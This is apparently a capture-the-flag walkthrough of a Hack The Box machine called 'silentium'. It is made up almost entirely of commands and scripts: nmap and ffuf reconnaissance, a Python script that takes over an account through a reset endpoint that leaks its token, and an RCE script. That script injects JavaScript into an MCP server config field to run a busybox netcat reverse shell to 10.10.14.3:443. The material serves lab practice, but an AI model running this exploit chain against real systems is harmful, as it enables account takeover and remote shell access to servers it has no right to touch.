
``` bash

❯ ip="10.129.92.31"

```

``` bash

❯ recon $ip
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-09 03:17 +0200
Nmap scan report for silenium.htb (10.129.92.31)
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
[*] First script done
[*] Open ports = '22,80'
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-09 03:17 +0200
Nmap scan report for silenium.htb (10.129.92.31)
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
[*] Done
╭─ ~/hacking/ctf/htb/easy/silenium/recon                                                                     ✔ │ 25s ─╮
╰─                                                                                                                   ─╯

```


``` bash


❯ ffuf -u http://silentium.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.silentium.htb" -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 46ms]
:: Progress: [10335/114442] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:09] :: Errors: 0 ::


```


``` bash

❯ echo "$ip staging.silentium.htb" | sudo tee -a /etc/hosts
10.129.92.31 staging.silentium.htb
╭─ ~/hacking/ctf/htb/easy/silenium/recon                                                                           ✔ ─╮
╰─                                                                                                                   ─╯


```


``` bash

❯ curl -X GET "http://staging.silentium.htb/api/v1/version"
{"version":"3.0.5"}

```



``` python

import requests

url = "http://staging.silentium.htb"
email = "ben@silentium.htb"
password = "Test123"

def change_password():

    headers = {'Content-Type': 'application/json'}

    data = {'user': {'email': email}}

    try:

        r = requests.post(url + "/api/v1/account/forgot-password", headers=headers, json=data, timeout=10)

        print("Status:", r.status_code)
        print("Response:", r.json())
        if r.status_code == 201:

            r_json = r.json()
            temp_token = r_json['user']['tempToken']

        data = {'user': {'email': email, 'tempToken': temp_token, "password": password}}

        r = requests.post(url + "/api/v1/account/reset-password", headers=headers, json=data, timeout=10)

        print("[+] Password changed")

    except Exception as e:

        print(f"[-] Error: {e}")

if __name__ == "__main__":

    change_password()

```



``` python

import requests

url = "http://staging.silentium.htb"
email = "ben@silentium.htb"
password = "Test123"
lhost = "10.10.14.3"
lport = "443"


def change_password():

    headers = {'Content-Type': 'application/json'}

    data = {'user': {'email': email}}

    try:

        r = requests.post(url + "/api/v1/account/forgot-password", headers=headers, json=data, timeout=10)

        print("Status:", r.status_code)
        print("Response:", r.json())
        if r.status_code == 201:

            r_json = r.json()
            temp_token = r_json['user']['tempToken']

        data = {'user': {'email': email, 'tempToken': temp_token, "password": password}}

        r = requests.post(url + "/api/v1/account/reset-password", headers=headers, json=data, timeout=10)

        print("[+] Password changed")

    except Exception as e:

        print(f"[-] Error: {e}")


def login():

     try:

         s = requests.Session()
         data = {"email": email, "password": password}
         headers = {"Content-Type": "application/json"}
         r = s.post(url + "/api/v1/auth/login", headers=headers, json=data, timeout=10)
         return s, r

     except Exception as e:

              print(f"Error: {e}")
def rce():

    session, response = login()
    print("Login:", response.status_code)

    cmd = f"busybox nc {lhost} {lport} -e sh"
    command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'

    data = {
        "loadMethod": "listActions",
        "inputs": {
            "mcpServerConfig": command
        }
    }
    session.headers.update({"x-request-from": "internal"})

    try:

        r = session.post(url + "/api/v1/node-load-method/customMCP", json=data, timeout=10)

        print("[+] Command executed")

        print(r.text)

    except requests.exceptions.Timeout:

               print("[+] Got it")

    except Exception as e:

               print(f"Error: {e}")



if __name__ == "__main__":

        change_password()
        rce()

```

